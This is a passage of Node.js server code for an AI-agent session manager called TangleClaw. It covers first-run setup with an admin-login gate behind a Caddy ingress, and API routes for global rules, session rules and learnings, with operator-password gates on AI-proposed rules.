  if (firstRun) {
    if (!await engines.anyEngineInstalled()) {
      return errorResponse(
        res,
        400,
        'No AI engine is installed, so there would be nothing to launch. Install one '
        + '(Claude Code, Codex, Aider or Antigravity), then press Check again.',
        'ENGINE_REQUIRED'
      );
    }
  }

  // Snapshot HTTPS state before mutations so we can decide whether to restart
  const prevHttps = {
    enabled: !!config.httpsEnabled,
    certPath: config.httpsCertPath || null,
    keyPath: config.httpsKeyPath || null
  };

  // Update config fields
  if (body.projectsDir && typeof body.projectsDir === 'string') {
    config.projectsDir = body.projectsDir;
  }
  if (body.defaultEngine && typeof body.defaultEngine === 'string') {
    config.defaultEngine = body.defaultEngine;
  }
  if (body.deletePassword !== undefined) {
    if (body.deletePassword && typeof body.deletePassword === 'string') {
      config.deletePassword = projects.hashPassword(body.deletePassword);
    } else {
      config.deletePassword = null;
    }
  }
  if (typeof body.chimeEnabled === 'boolean') {
    config.chimeEnabled = body.chimeEnabled;
  }

  // HTTPS fields
  if (typeof body.httpsEnabled === 'boolean') {
    config.httpsEnabled = body.httpsEnabled;
  }
  if (body.httpsCertPath === null || typeof body.httpsCertPath === 'string') {
    config.httpsCertPath = body.httpsCertPath || null;
  }
  if (body.httpsKeyPath === null || typeof body.httpsKeyPath === 'string') {
    config.httpsKeyPath = body.httpsKeyPath || null;
  }

  if (config.httpsEnabled && config.httpsCertPath && config.httpsKeyPath) {
    const validation = httpsSetup.validateCertFiles(config.httpsCertPath, config.httpsKeyPath);
    if (!validation.ok) {
      return errorResponse(res, 400, `HTTPS cert validation failed: ${validation.error}`, 'BAD_REQUEST');
    }
  } else if (config.httpsEnabled && (config.httpsCertPath || config.httpsKeyPath)) {
    return errorResponse(res, 400, 'Both httpsCertPath and httpsKeyPath are required when HTTPS is enabled with cert paths', 'BAD_REQUEST');
  }

  // AUTH-2 — forced first-run admin in caddy ingress mode. The login gate lives at
  // Caddy (basic_auth), so completing setup behind Caddy with NO credential would
  // leave the box reachable AND unauthenticated. Require an admin: either supplied
  // now (adminUser + adminPassword, hashed here via `caddy hash-password`) or
  // already configured. The wizard only sends these in caddy mode, but the gate is
  // enforced server-side so it can't be bypassed.
  const inCaddyMode = config.ingressMode === 'caddy';
  const adminProvided = body.adminUser !== undefined || body.adminPassword !== undefined;
  // The credential write is first-run only, for the same reason the cutover spawn
  // above is: this route authenticates nobody. Without this, an unauthenticated
  // caller could POST a credential of their choosing onto an ALREADY-COMPLETED
  // install — and on the ungated, network-reachable legacy grace state that is
  // reachable from off-box. Refuse loudly rather than ignoring the field: silently
  // dropping a credential the caller believes it set is its own false report, and
  // the wizard would have no way to tell the difference.
  if (adminProvided && !firstRun) {
    // Names both routes that can change a credential on a completed install: the
    // settings surface, which refuses unless a live gate is already
    // authenticating the caller, and the script, which requires local shell
    // access. Either bar is the right one for a route that authenticates nobody.
    //
    // It covers the case this refusal actually meets: an install that HAS a
    // credential and wants a different one. It does NOT cover a completed,
    // caddy-mode install with no credential at all — `resolveTargetUser` exits 1
    // there, because it resets a gate rather than creating one. That state has no
    // in-product way out (refused here for carrying a credential, refused below
    // with ADMIN_REQUIRED for not carrying one) and is tracked as #806. It is not
    // reachable from a first run on this code — setup will not complete in caddy
    // mode without a credential — only from a legacy install that got there
    // before the credential became mandatory.
    return errorResponse(res, 409,
      'Setup is already complete. Change the admin login from global settings, or run '
      + '`node scripts/reset-admin.js` at a terminal.',
      'SETUP_ALREADY_COMPLETE');
  }
  if (adminProvided) {
    const adminUser = typeof body.adminUser === 'string' ? body.adminUser.trim() : '';
    const adminPassword = typeof body.adminPassword === 'string' ? body.adminPassword : '';
    if (!adminUser) {
      return errorResponse(res, 400, 'adminUser is required to set an admin credential', 'BAD_REQUEST');
    }
    const pwCheck = caddy.validateAdminPassword(adminPassword, adminUser);
    if (!pwCheck.ok) {
      return errorResponse(res, 400, pwCheck.error, 'BAD_REQUEST');
    }
    let hash;
    try {
      hash = caddy.hashPassword(adminPassword);
    } catch (err) {
      // Never log the plaintext; the message is the caddy failure, not the secret.
      log.error('Admin credential hashing failed during setup', { error: err.message });
      return errorResponse(res, 500, `Could not hash admin password: ${err.message}`, 'HASH_FAILED');
    }
    // Persist the credential. The live Caddyfile gate is (re)applied by the ingress
    // cutover, which reads authEnabled — so a warning is surfaced below when the
    // running ingress isn't yet gated.
    config.authEnabled = true;
    config.basicAuthUser = adminUser;
    config.basicAuthHash = hash;
    log.info('Admin credential set during setup (basic_auth gate)', { user: adminUser, ingressMode: config.ingressMode });
  }

  const adminConfigured = !!(config.authEnabled && config.basicAuthUser && config.basicAuthHash);
  if (inCaddyMode && !adminConfigured) {
    return errorResponse(res, 400,
      'An admin username and password are required to finish setup while running behind the Caddy ingress (basic_auth login gate).',
      'ADMIN_REQUIRED');
  }
  // The flip: on a machine where a gate CAN be put up, finishing setup without a
  // credential is refused even though this install is still in direct mode. The
  // wizard shows the step in exactly this case, so reaching here without one means
  // the step was bypassed rather than answered.
  if (ingressPlan.action === 'provision' && !adminConfigured) {
    return errorResponse(res, 400,
      'An admin username and password are required to finish setup. TangleClaw puts a login in front of '
      + 'itself by default, and this machine can run one.',
      'ADMIN_REQUIRED');
  }

  // Mark setup as complete
  config.setupComplete = true;
  store.config.save(config);

  // Attach selected projects
  const attached = [];
  // Resolved once for the whole batch. `resolveDefaultEngine` runs
  // `listWithAvailability()`, which shells out a detection probe per engine
  // profile, so resolving per item multiplied that across the request — and a
  // mid-batch change in what is installed would register different projects
  // against different engines, which is worse than being slow.
  const batchDefaultEngine = engines.resolveDefaultEngine(config)
    || config.defaultEngine
    || store.DEFAULT_CONFIG.defaultEngine;
  if (Array.isArray(body.projects)) {
    for (const proj of body.projects) {
      if (!proj || !proj.name || !proj.path) continue;

      // Validate path exists and is a directory before registering
      if (!fs.existsSync(proj.path) || !fs.statSync(proj.path).isDirectory()) {
        warnings.push(`Skipped "${proj.name}": path does not exist or is not a directory`);
        continue;
      }

      // Skip if already registered — case-insensitive identity check (#221)
      // so the startup-sync doesn't silently double-register a case-collision.
      const existing = store.projects.getByNameCaseInsensitive(proj.name);
      if (existing) {
        const msg = existing.name === proj.name
          ? `Project "${proj.name}" already registered, skipped`
          : `Project "${proj.name}" already registered as "${existing.name}" (case-insensitive match), skipped`;
        warnings.push(msg);
        continue;
      }

      // Register in SQLite
      try {
        // Resolve against installed engines — the wizard's own engine step shows
        // what's available, so attaching against an uninstalled default would
        // contradict the screen the operator just used. Falls back to the
        // configured intent when nothing is installed (attaching is bookkeeping;
        // it doesn't run an engine).
        const engineId = batchDefaultEngine;

        store.projects.create({
          name: proj.name,
          path: proj.path,
          engine: engineId,
          tags: [],
          ports: {}
        });

        // Write per-project config if none exists
        const projConfigPath = path.join(proj.path, '.tangleclaw', 'project.json');
        if (!fs.existsSync(projConfigPath)) {
          const projConfig = JSON.parse(JSON.stringify(store.DEFAULT_PROJECT_CONFIG));
          projConfig.engine = engineId;
          store.projectConfig.save(proj.path, projConfig);
        }

        attached.push(proj.name);
      } catch (err) {
        warnings.push(`Failed to attach "${proj.name}": ${err.message}`);
      }
    }
  }

  // ── Put the login in force (or say honestly that none is) ──
  //
  // Deliberately the LAST thing before the response. The cutover child's final
  // act is `launchctl kickstart -k` on this server, so anything still to do here
  // — attaching projects above, writing the response below — must already be
  // done or in flight. Spawning earlier would race a restart against the work.
  const hostHeader = (req.headers && req.headers.host) ? String(req.headers.host) : '';
  // Validated, not merely split. This value is echoed back into a URL the wizard
  // renders into markup, and a `Host` header is caller-supplied — so anything
  // outside a hostname's own alphabet is discarded rather than escaped. Escaping
  // is the wrong tool here: HTML-entity-encoding a quote inside an inline event
  // handler decodes back to a quote before the script sees it, which reopens the
  // hole it was supposed to close. Same alphabet the mkcert host check uses.
  const rawHostname = hostHeader.split(':')[0];
  const requestHostname = (rawHostname && HOST_RE.test(rawHostname)) ? rawHostname : 'localhost';
  const ingress = {
    action: ingressPlan.action,
    provisioning: false,
    // Sent with the completion, not only from the poll, because the poll is
    // exactly what may never answer: the cutover restarts the server and closes
    // the address this page was served from, and for a remote operator that is
    // the COMMON case. The wizard then ends on a screen that knows least about
    // what happened and most needs to say where the rest is written. Delivering
    // it here means it arrives before the origin can close. Relative on purpose —
    // the resolved path names the OS account.
    logLocation: ingressProvision.CUTOVER_LOG_RELATIVE,
    // 'pending' only ever means "a cutover is running and the answer is not in
    // yet"; the wizard resolves it by polling /api/setup/provision-status.
    protection: 'none',
    // Whenever this ends with no login in force, the explanation goes into BOTH
    // `reason` and `warnings`. `warnings` is the complete machine-readable list,
    // because a client that reads only that field must still learn the install is
    // ungated; `reason` is the wizard's prose copy. They overlap by design.
    //
    // The push happens once, after the whole if/else chain below — not per-arm. An
    // outcome can reach no arm at all, and per-arm pushes left that case reporting
    // nothing. De-duplicating belongs at the point of RENDER: `_warningsBlock` in
    // public/setup.js drops any warning the screen has already printed. Suppressing
    // the push instead silently narrows the API for every non-wizard consumer.
    reason: ingressPlan.reason || null,
    remedy: ingressPlan.remedy || null,
    user: null,
    url: null,
    // Whether the network can reach this server, read from the one classification
    // rather than assumed. "Ungated but loopback-only" and "ungated and reachable"
    // are different situations, and the wizard must not tell an install held wide
    // in the legacy grace state that it is reachable from this machine only —
    // that is the operator most at risk of believing a false reassurance.
    networkExposed: bindPolicy.describeBindState(config).wide === true
  };

  if (ingressPlan.action === 'provision') {
    // spawnCutover clears any previous outcome itself, so the poller cannot read
    // an earlier run's result as this one's.
    const started = _spawnCutover({ target: 'caddy' });
    if (started.ok) {
      ingress.provisioning = true;
      ingress.protection = 'pending';
      ingress.user = config.basicAuthUser || null;
      // Where the gate is about to listen. Asked of the config this cutover is
      // MOVING to, not the one on disk — `ingressMode` is still whatever it was
      // until the cutover writes it, and the question here is where the operator
      // goes once this lands. One derivation, shared with the restart redirect
      // below, so the two answers to "where do I go now" cannot drift.
      ingress.url = httpsSetup.effectiveOperatorOrigin(
        { ...config, ingressMode: 'caddy' }, requestHostname);
      // The whole address, not just the host: scheme and port are the two halves
      // this derivation exists to get right, and the operator is almost never at
      // this machine to read the browser that was told them.
      log.info('Setup started the ingress cutover',
        { pid: started.pid, host: requestHostname, operatorUrl: ingress.url });
    } else {
      // The credential is stored and nothing enforces it. Say so — this is the
      // one outcome this path exists to make impossible to mistake for success.
      ingress.reason = `TangleClaw could not start the ingress cutover: ${started.error}. `
        + 'Your login has been saved but nothing is enforcing it yet.';
      ingress.remedy = 'Run `node scripts/ingress-cutover.js --to caddy` at a terminal.';
      log.error('Setup could not start the ingress cutover', { error: started.error });
    }
  } else if (ingressPlan.action === 'adopt') {
    // Adoption already ran, above the credential gates. Report what it answered.
    const after = config;
    if (adminProvided) {
      // The operator typed a credential on a machine whose plan was to ADOPT one.
      // Reachable: the Skip route refuses in caddy mode without a configured
      // credential, and the wizard then forces the admin step. Adoption ran first,
      // then the typed credential overwrote it in config — so config now holds what
      // they typed while the untouched hand-maintained Caddyfile still enforces what
      // was adopted. Their new password will not work and the old one will.
      //
      // Reporting `existing` here (naming the ADOPTED user, which is what the code
      // did) tells them their existing login was kept when in fact two credentials
      // now disagree. Name the mismatch instead, and name the account THEY set.
      ingress.protection = 'existing-unverified';
      ingress.user = after.basicAuthUser || null;
      ingress.reason = 'The login you just set has been saved, but the Caddy config in front of '
        + 'TangleClaw is maintained by hand and was not changed — so it is still enforcing the '
        + 'credential it already had, not the new one.';
      ingress.remedy = 'Set both from one place with `node scripts/reset-admin.js`, which rewrites '
        + 'the credential in the live Caddy config as well.';
      // `reason` reaches `warnings` from the single push after this chain — see the
      // note on `reason` above. The screen still shows it once because the render
      // de-duplicates, not because any arm withholds it.
      log.warn('Setup saved a credential the live Caddy config does not enforce', {
        user: after.basicAuthUser || null
      });
    } else if (adoption && adoption.adopted) {
      ingress.protection = 'existing';
      ingress.user = adoption.user || after.basicAuthUser || null;
    } else if (after.authEnabled && after.basicAuthUser && after.basicAuthHash) {
      // Config already carried a credential, so adoption deliberately no-opped
      // rather than overwriting it. The live Caddyfile may enforce a DIFFERENT
      // one, and nothing here can tell — so this is not "your existing login was
      // kept". Reporting it as such is how a config-vs-live mismatch becomes
      // invisible, which this repo already ships an auth-drift warning for.
      ingress.protection = 'existing-unverified';
      ingress.user = after.basicAuthUser;
      ingress.reason = 'A login is already configured and a hand-maintained Caddy config is in front '
        + 'of TangleClaw. TangleClaw did not change either, and cannot tell whether they carry the '
        + 'same credential.';
      ingress.remedy = 'If your saved login does not work, set both from one place with '
        + '`node scripts/reset-admin.js`.';
    } else {
      ingress.reason = 'An existing Caddy login was found but could not be adopted'
        + `${adoption && adoption.reason ? ` (${adoption.reason})` : ''}, so TangleClaw cannot confirm a login is in force.`;
      ingress.remedy = 'Set the credential explicitly with `node scripts/reset-admin.js`.';
      // Unreachable by construction, kept as the honest fallback if that ever changes.
      // An `adopt` plan only exists in caddy mode, and the caddy-mode credential gate
      // above refuses the request before this block runs whenever no complete credential
      // is configured — which is exactly this branch's condition. Pinned by
      // "refuses outright when adoption declines and no credential is configured".
      log.warn('Setup could not adopt the existing Caddy login', {
        reason: (adoption && adoption.reason) || null
      });
    }
  } else if (adminConfigured) {
    // Refused, but a credential IS configured (an install already in caddy mode,
    // or one the operator set earlier). It is stored, and the live Caddyfile will
    // not be regenerated from here — so nothing at this point can confirm the
    // credential is enforced. Deliberately NOT "as active as that file makes it":
    // two states reaching this arm have nothing serving that file at all, and the
    // warning below exists precisely because naming the Caddyfile as what governs
    // protection is a false reassurance. Activating belongs at a terminal, where
    // the cutover's backup and rollback exist.
    ingress.protection = 'unchanged';
    ingress.user = config.basicAuthUser || null;
    // States the situation and names no command. Every path here is refuse +
    // adminConfigured, and in almost all of them the live Caddyfile is hand-edited —
    // so a bare `--to caddy` is the form the cutover's own guard REFUSES, and for an
    // unreadable file `--force` is not honored at all. The plan's `remedy` is the
    // state-specific answer and renders on this same screen; a fixed command here
    // put the failing form under "Also worth knowing" beside the working one.
    //
    // It also must not name the Caddyfile as what determines whether the login is
    // active. In two states nothing is serving that file at all — no Caddy binary, or
    // an adoptable config while the install runs in direct mode — and claiming the file
    // governs protection is the false-reassurance this endpoint exists to avoid. Say
    // only what is true everywhere: the live ingress was not changed, so nothing here
    // can confirm the login is enforced.
    warnings.push('Admin credential saved, but TangleClaw did not change the live ingress '
      + 'config — so it cannot confirm anything is enforcing this login.');
    // A completed install re-POSTing here gets a plan built without `decideProvisioning`,
    // whose `remedy` is null — so removing the command from the warning above left that
    // path with no next step whatsoever. The dry-run is the one instruction that is both
    // safe and honest in every state: it writes nothing, and it reports the situation it
    // finds rather than assuming a gate can be activated.
    if (!ingress.remedy) {
      ingress.remedy = 'Run `node scripts/ingress-cutover.js --to caddy --dry-run` at a '
        + 'terminal to see what activating the login gate would do.';
    }
  }

  // THE derivation of what `protection` MEANS, in one place, next to where the value
  // is produced (#861). Before this, the same judgement was re-made by comparing the
  // enum against a literal list in three places — once here and TWICE in
  // `public/setup.js` — so the browser was a second source of truth for a security
  // decision. There is no build step, so a shared constant module is not importable by
  // `public/`; deriving server-side and shipping the ANSWER is the available correct
  // form, and it is the same one `decideProvisioning` already uses for the
  // provisioning table.
  //
  // Stated as an ALLOWLIST, and that inversion is the substance of the fix rather than
  // a stylistic preference. The old lists enumerated the states meaning "not protected",
  // so an unrecognised sixth value matched none of them and fell through to the path
  // that DISMISSES the warning — a new state would silently stop telling the operator
  // nothing is enforcing a login, which is the precise false-reassurance the v5 Secure
  // Baseline exists to eliminate. Naming the one state that means "confirmed" instead
  // makes an unknown value fail safe: not confirmed, so the operator is told.
  //
  // Which states produce which SCREEN is unchanged, deliberately: this change is a
  // de-duplication, and these are the least-verified screens in the release (#802),
  // so what is decided must not move in the same commit that moves WHO decides it.
  // `credentialStored` is a wider set than the pair `public/setup.js` used to test —
  // it includes the confirmed state, because the field is named for a fact and must
  // report it — but that value is unreachable by the only consumer, which reads it
  // solely inside the not-confirmed branch. Wider field, identical screens.
  Object.assign(ingress, ingressProvision.deriveProtectionFlags(ingress.protection));

  // One place, after every branch, so the guarantee holds for outcomes that reach no
  // branch at all — `refuse` with no credential anywhere (no Caddy installed, or a
  // Caddyfile too ambiguous to adopt) sets `reason` from the plan and enters nothing
  // below. Doing this per-arm left exactly that case — the plainest ungated install
  // there is — telling a warnings-only client nothing.
  //
  // Only the states that mean "no login is in force" qualify. 'existing' is excluded
  // because its `reason` describes a gate that IS in force ("will be kept rather than
  // replaced") — restating that as a warning invents a problem. 'pending' is excluded
  // too, but is inert rather than dangerous: `decideProvisioning` returns an empty
  // reason for `provision`, so there is nothing to push in that state either way. Both
  // exclusions now read off the derived answers rather than re-listing the enum:
  // `provisioning` is set in the same block as 'pending' and is its only producer.
  //
  // The `includes` check is a forward interlock, not a live de-duplicator: no arm above
  // pushes this exact string today, so it never fires. It is here so that adding an arm
  // that does push `reason` cannot silently double it.
  if (ingress.reason
      && !ingress.confirmedProtection
      && !ingress.provisioning
      && !warnings.includes(ingress.reason)) {
    warnings.push(ingress.reason);
  }

  // Whether setup ended with a login in force is the outcome this endpoint exists to
  // get right, and until now only the unhappy arms left a trace: the confirmed arm
  // dismissed into the dashboard silently, so a support question about an install
  // that "says it is protected" had nothing on the server to read back. Logged at
  // both outcomes so the record is symmetric — an absent line means the request never
  // reached here, rather than meaning everything was fine.
  log.info('Setup reported its protection verdict', {
    protection: ingress.protection,
    confirmedProtection: ingress.confirmedProtection,
    credentialStored: ingress.credentialStored,
    provisioning: ingress.provisioning === true
  });

  // Decide whether to schedule a restart so the server re-binds with the new protocol
  const prevWillServeHttps = !!(prevHttps.enabled && prevHttps.certPath && prevHttps.keyPath);
  const willServeHttps = !!(config.httpsEnabled && config.httpsCertPath && config.httpsKeyPath);
  const httpsChanged = prevHttps.enabled !== !!config.httpsEnabled
    || prevHttps.certPath !== (config.httpsCertPath || null)
    || prevHttps.keyPath !== (config.httpsKeyPath || null);
  // A running cutover restarts the server itself, as its last launchctl step. A
  // second restart scheduled here would race it — and in caddy mode the HTTPS
  // config it exists to apply is not what the listener uses anyway (Caddy
  // terminates TLS; `effectiveServerProtocol` returns http). The cert the wizard
  // generated is still used — by Caddy, via the cutover.
  const shouldRestart = !ingress.provisioning
    && httpsChanged && (willServeHttps || prevWillServeHttps);

  let redirectUrl = null;
  let redirectVia = null;
  if (shouldRestart) {
    // The same derivation the provisioning arm uses. It used to compose the
    // scheme from `willServeHttps` and the port from TC's own listener, which is
    // right in direct mode and wrong in caddy mode — where TC serves plain HTTP
    // on the loopback and the front door is Caddy's HTTPS port. That case is
    // reachable: a caddy-mode install whose operator changes a cert path in the
    // wizard satisfies `shouldRestart`, and the old expression sent them to a
    // port nothing answers on.
    const frontDoor = httpsSetup.effectiveOperatorFrontDoor(config, requestHostname);
    redirectUrl = frontDoor.origin;
    // Who answers there, so the wizard does not read a response as proof the
    // server is back. Behind Caddy it is not: Caddy stays up across TC's restart
    // and answers immediately — with a 502, which an opaque `no-cors` probe
    // cannot tell from success.
    redirectVia = frontDoor.via;
    log.info('Setup will restart; operator front door computed',
      { redirectUrl, via: redirectVia });
    _scheduleRestart();
  }

  if (warnings.length > 0) {
    // A skipped project vanished silently before: the wizard never read
    // `warnings`, so the operator finished setup believing every directory they
    // ticked had been attached. Log it regardless of what the client does.
    log.warn('Setup completed with skipped projects', { count: warnings.length, warnings });
  }

  jsonResponse(res, 200, {
    ok: true,
    setupComplete: true,
    attached,
    warnings,
    restart: shouldRestart,
    redirectUrl,
    redirectVia,
    ingress
  });
});

// GET /api/rules/global
route('GET', '/api/rules/global', (_req, res) => {
  const content = store.globalRules.load();
  jsonResponse(res, 200, { content });
});

// PUT /api/rules/global
// #212 — bumped body cap to 256 KB. The default MAX_BODY_SIZE of 10 KB
// was below the size of the canonical bundled `data/global-rules.md`
// (14 KB and growing as new conventions land), so every PUT — whether
// from the landing-page editor or the API — was returning 413. 256 KB
// gives ~18x headroom over current size; even a 10x growth in the
// ruleset stays well under the limit. Other large-body routes use the
// same per-route override pattern — see `/api/audit/ingest` at the
// 512 KB cap (`server.js:2834`) and the upload route at 15 MB
// (`server.js:1574`).
route('PUT', '/api/rules/global', (_req, res, _params, body) => {
  if (typeof body.content !== 'string') {
    return errorResponse(res, 400, 'content (string) is required', 'BAD_REQUEST');
  }
  store.globalRules.save(body.content);
  jsonResponse(res, 200, { ok: true });
}, { maxBodySize: 256 * 1024 });

// POST /api/rules/global/reset
route('POST', '/api/rules/global/reset', (_req, res) => {
  const content = store.globalRules.reset();
  jsonResponse(res, 200, { content });
});

// ── Session Rules API (#347/D1a) ──
// Durable operator/AI-authored per-project behavioral directives. 'startup'
// rules inject cross-model at session launch; 'wrap' rules inject into the
// wrap pipeline's ai-content prompt. Persisting a rule does NOT force a
// config regen — configs pick it up on next session launch / syncAllProjects,
// identical to how global-rules edits propagate today. Rules are always
// project-scoped: the hidden global tier (projectId omitted) was retired —
// cross-project directives belong in the Global rules document
// (`/api/rules/global` → data/global-rules.md).

// GET /api/session-rules — list (optional ?projectId= / ?kind=)
route('GET', '/api/session-rules', (req, res) => {
  const urlObj = reqUrl(req);
  const query = parseQuery(urlObj.search);
  const options = {};
  if (query.projectId !== undefined) options.projectId = Number(query.projectId);
  // CC-6 (#381): filter the per-project modal's rule boxes by kind.
  if (query.kind !== undefined) options.kind = query.kind;
  // #569: review state. Unfiltered by default; the Project Rules modal fetches
  // unfiltered and renders proposals with a "Proposed" badge (rejections it
  // drops client-side — a rejected row is a decision record, not a rule).
  if (query.status !== undefined) options.status = query.status;
  const rules = store.sessionRules.list(options);
  jsonResponse(res, 200, { rules });
});

// GET /api/session-rules/deliveries — the #595 delivery ledger. Answers "did
// session X receive rule set Y" (?sessionId=) and "is this project actually
// receiving its rules" (?projectId=, newest first). Undelivered attempts are
// included on purpose: an empty-looking project and a severed channel must be
// distinguishable, which is the failure this ledger exists to expose.
route('GET', '/api/session-rules/deliveries', (req, res) => {
  const query = parseQuery(reqUrl(req).search);
  if (query.sessionId !== undefined) {
    return jsonResponse(res, 200, { deliveries: store.sessionRuleDeliveries.listForSession(Number(query.sessionId)) });
  }
  if (query.projectId !== undefined) {
    const options = {};
    if (query.limit !== undefined) options.limit = Number(query.limit);
    return jsonResponse(res, 200, { deliveries: store.sessionRuleDeliveries.listForProject(Number(query.projectId), options) });
  }
  // No scope given → the fleet-wide health answer: every project that HAS
  // startup rules but has never had one delivered. This is #595's original
  // question, and it needs no argument to be worth asking.
  return jsonResponse(res, 200, { undelivered: store.sessionRuleDeliveries.projectsWithUndeliveredRules() });
});

// POST /api/session-rules — create { content, projectId, createdBy?, kind? }
route('POST', '/api/session-rules', (_req, res, _params, body) => {
  if (!body || typeof body.content !== 'string' || !body.content.trim()) {
    return errorResponse(res, 400, 'content (non-empty string) is required', 'BAD_REQUEST');
  }
  try {
    const rule = store.sessionRules.create({
      content: body.content,
      // Required for every kind except 'master' (singleton-scoped, projectId
      // forbidden) — the store enforces both directions with BAD_REQUEST.
      projectId: body.projectId,
      createdBy: body.createdBy || 'operator',
      // CC-6 (#381): 'startup' (default) | 'wrap' | 'master'. Invalid → store throws BAD_REQUEST.
      kind: body.kind,
      // SR-7K2P: optional Critic-gate attestation. Invalid → store throws BAD_REQUEST.
      criticGate: body.criticGate
    });
    jsonResponse(res, 201, rule);
  } catch (err) {
    if (err.code === 'BAD_REQUEST') {
      return errorResponse(res, 400, err.message, 'BAD_REQUEST');
    }
    throw err;
  }
}, { maxBodySize: 256 * 1024 });

/**
 * Eyes-open gate for the Project Master's baseline Hard rules: weakening a
 * `created_by='system'` master rule (edit, disable, delete) requires an
 * explicit confirmation flag, mirroring the `confirmBypassHidden` launch-mode
 * guard — the server enforces it, the UI merely surfaces the confirm. Restore
 * defaults always recovers the shipped baseline regardless.
 * @param {object|null} rule - The rule being mutated
 * @param {boolean} confirmed - Whether the caller sent the confirm flag
 * @returns {boolean} true when the mutation must be refused
 */
function refuseUnconfirmedBaselineEdit(rule, confirmed) {
  return !!(rule && rule.kind === 'master' && rule.createdBy === 'system' && !confirmed);
}

// PUT /api/session-rules/:id — update { content?, enabled?, confirmBaselineEdit? }
route('PUT', '/api/session-rules/:id', (_req, res, params, body) => {
  if (!body || typeof body !== 'object') {
    return errorResponse(res, 400, 'Request body must be a JSON object', 'BAD_REQUEST');
  }
  try {
    const existing = store.sessionRules.get(Number(params.id));
    const weakens = body.content !== undefined || body.enabled === false || body.enabled === 0;
    if (weakens && refuseUnconfirmedBaselineEdit(existing, body.confirmBaselineEdit === true)) {
      return errorResponse(res, 400,
        'This is a shipped Master boundary rule — editing or disabling it requires confirmBaselineEdit: true (Restore defaults always recovers the baseline)',
        'CONFIRM_REQUIRED');
    }
    const { confirmBaselineEdit, ...updates } = body;
    const rule = store.sessionRules.update(Number(params.id), updates);
    jsonResponse(res, 200, rule);
  } catch (err) {
    if (err.code === 'NOT_FOUND') {
      return errorResponse(res, 404, err.message, 'NOT_FOUND');
    }
    if (err.code === 'BAD_REQUEST') {
      return errorResponse(res, 400, err.message, 'BAD_REQUEST');
    }
    throw err;
  }
}, { maxBodySize: 256 * 1024 });

// DELETE /api/session-rules/:id — ?confirm=true required for shipped Master
// baseline rules (see refuseUnconfirmedBaselineEdit)
route('DELETE', '/api/session-rules/:id', (req, res, params) => {
  try {
    const query = parseQuery(reqUrl(req).search);
    const existing = store.sessionRules.get(Number(params.id));
    if (refuseUnconfirmedBaselineEdit(existing, query.confirm === 'true')) {
      return errorResponse(res, 400,
        'This is a shipped Master boundary rule — deleting it requires ?confirm=true (Restore defaults always recovers the baseline)',
        'CONFIRM_REQUIRED');
    }
    store.sessionRules.delete(Number(params.id));
    jsonResponse(res, 200, { ok: true, id: Number(params.id) });
  } catch (err) {
    if (err.code === 'NOT_FOUND') {
      return errorResponse(res, 404, err.message, 'NOT_FOUND');
    }
    throw err;
  }
});

// ── Session Rules self-improvement (D1b) ──
// Versioning + rollback, learnings→rule promotion, and the non-authoritative
// conflict-candidate signal. The Critic-gate for conflicting/autonomous edits is
// an IN-SESSION agent capability (the server cannot summon a Critic) — see
// `docs/session-rules-self-improvement.md`.

// POST /api/session-rules/promote — promote a learning into a rule (operator-confirmed)
route('POST', '/api/session-rules/promote', (_req, res, _params, body) => {
  if (!body || body.learningId === undefined) {
    return errorResponse(res, 400, 'learningId is required', 'BAD_REQUEST');
  }
  // This route mints a LIVE rule from AI-authored text, so it carries the same
  // operator gate as approval. It previously asserted operator authority simply
  // because the route had been reached — but this API is on localhost and this
  // project instructs in-session agents to call it, so "a request arrived" is
  // not evidence a human sent it.
  const promoteCheck = projects.checkDeletePassword(body ? body.password : undefined);
  if (!promoteCheck.allowed) return errorResponse(res, 403, promoteCheck.error, 'FORBIDDEN');
  try {
    const rule = store.sessionRules.promoteFromLearning(Number(body.learningId), {
      content: body.content,
      projectId: body.projectId ?? null,
      createdBy: body.createdBy,
      // CC-6 (#381): the wrap-time self-critique loop promotes a learning into a 'wrap' rule.
      kind: body.kind,
      // SR-7K2P: optional Critic-gate attestation. Invalid → store throws BAD_REQUEST.
      criticGate: body.criticGate,
      // #569: authority comes from clearing the operator gate above, not from
      // the request claiming it. Without this the store would treat AI-authored
      // content as a proposal and the operator's own approval would land back
      // in the queue they just cleared; the wrap's proposal step calls the same
      // store method WITHOUT it and gets a proposal.
      approvedByOperator: true
    });
    jsonResponse(res, 201, rule);
  } catch (err) {
    if (err.code === 'NOT_FOUND') return errorResponse(res, 404, err.message, 'NOT_FOUND');
    if (err.code === 'BAD_REQUEST') return errorResponse(res, 400, err.message, 'BAD_REQUEST');
    throw err;
  }
}, { maxBodySize: 256 * 1024 });

// PUT /api/session-rules/:id/status — resolve a proposal (#569).
// Approve ('active') or decline ('rejected') a rule the wrap proposed. A
// rejection is RECORDED rather than deleted: the wrap proposes from recurring
// learnings, so a deleted decision would simply be re-proposed at the next wrap.
route('PUT', '/api/session-rules/:id/status', (_req, res, params, body) => {
  if (!body || typeof body.status !== 'string') {
    return errorResponse(res, 400, 'status is required', 'BAD_REQUEST');
  }
  // Approving a proposal grants it authority over every future session, so it
  // is gated like TangleClaw's other privileged operations (project delete,
  // session kill, wrap) rather than inferred from a caller-supplied field.
  // `changedBy` is the caller describing itself — an agent that omits it is
  // recorded as the operator — so it cannot be what decides this.
  //
  // Declining a proposal needs no gate: it grants nothing.
  if (body.status === 'active') {
    const check = projects.checkDeletePassword(body ? body.password : undefined);
    if (!check.allowed) return errorResponse(res, 403, check.error, 'FORBIDDEN');
  }
  try {
    const rule = store.sessionRules.setStatus(Number(params.id), body.status, {
      // Passing the gate IS the operator acting; recording anything else would
      // misattribute a decision the gate just authorised.
      changedBy: body.status === 'active' ? 'operator' : body.changedBy,
      changeReason: body.changeReason,
      criticGate: body.criticGate
    });
    jsonResponse(res, 200, rule);
  } catch (err) {
    if (err.code === 'NOT_FOUND') return errorResponse(res, 404, err.message, 'NOT_FOUND');
    if (err.code === 'BAD_REQUEST') return errorResponse(res, 400, err.message, 'BAD_REQUEST');
    if (err.code === 'FORBIDDEN') return errorResponse(res, 403, err.message, 'FORBIDDEN');
    throw err;
  }
}, { maxBodySize: 256 * 1024 });

// ── Learnings (#569) ──
// Until now there were no learnings routes at all, so the tier a learning sits
// at — the thing deciding whether it reaches a future session — was reachable
// only from inside the process. An operator could neither see the backlog nor
// correct a wrong promotion.

// GET /api/learnings?projectId=&tier=
route('GET', '/api/learnings', (req, res) => {
  const url = new URL(req.url, 'http://localhost');
  const projectId = url.searchParams.get('projectId');
  if (!projectId) return errorResponse(res, 400, 'projectId is required', 'BAD_REQUEST');
  const tier = url.searchParams.get('tier') || undefined;
  jsonResponse(res, 200, { learnings: store.learnings.list(Number(projectId), { tier }) });
});

